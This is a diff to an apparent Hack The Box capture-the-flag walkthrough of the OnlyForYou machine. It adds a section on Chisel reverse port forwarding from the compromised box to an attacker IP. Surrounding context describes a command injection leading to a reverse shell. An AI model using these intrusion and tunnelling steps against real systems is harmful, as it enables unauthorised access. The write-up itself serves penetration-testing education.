@@ -2,6 +2,8 @@
 
  https://app.hackthebox.com/machines/OnlyForYou
  
+ -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
  ## Enumeration:
  
  Started with the quick rustscan & observed 2 open ports 80 & 22.
@@ -29,6 +31,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 After the port scanning I observed a domain running on port 80, i.e. : http://only4you.htb/. I added the domain to the hosts file.
 
 I checked website & html source code but didn't found anything useful to get initial access.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ### Fuzzing:
 
@@ -157,7 +161,7 @@ def sendmessage(email, subject, message, ip):
 	else:
 		return status
 ```
-
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ### Code Analysis:
 
 ```
@@ -166,7 +170,7 @@ The 'issecure()' function checks if the email address is valid using a regular e
 Also, 'issecure()' function uses the 'run()' function to execute shell commands. This could potentially allow for command injection attacks if the domain variable is not properly sanitized.
 The regular expression used to validate email addresses is not very strict and could potentially allow for invalid email addresses to pass through.
 ```
-
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ### Initial access:
 
 Now, I have discovered the vulnerability by going through the source code in the send message part it's time to exploit it & get the reverse shell.
@@ -188,4 +192,30 @@ I added the payload after the e-mail address using the pipe & encoded it in URL 
 And, finally I received the shell, with the www-data user (pwn3d🙂!):
 
 ![image](https://user-images.githubusercontent.com/87700008/234581090-1a5947c4-398d-4839-92e1-659badd81f85.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### User access:
+
+As of now I have the access of the user 'www-data' but I don't have the user access & from this point I have to move laterally to get the user flag.
+Since I don't have password for the current user I start with checking the running processes I found few services running locally:
+
+![image](https://user-images.githubusercontent.com/87700008/234593441-58cdd0e2-5869-469c-b964-b6a94a6ea525.png)
+
+From these running services 2 of the listening ports caught my attention, i.e. 8001 & 7474. I already observed previously that there is a 'neo4j' user exist & the port 7474 is also running locally which means this box might be vulnerable to 'neo4j' exploit.
+
+For the service running on port 8001, I have to perform the port forwarding to my own attacker machine. I transferred the Chisel binary & intitated port forwarding to both of the ports.
+
+In my attacker machine:
+```
+./chisel_kill3r server -p 8000 --reverse
+```
+
+In the victim box:
+```
+./chisel_kill3r client 10.10.14.128:8000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
+```
+
+![image](https://user-images.githubusercontent.com/87700008/234597676-01546cda-1a2b-43bb-b21f-a10f988d9293.png)
+![image](https://user-images.githubusercontent.com/87700008/234597774-f0e7ef5c-bdce-465c-bf53-9b02a57ca2bc.png)
 
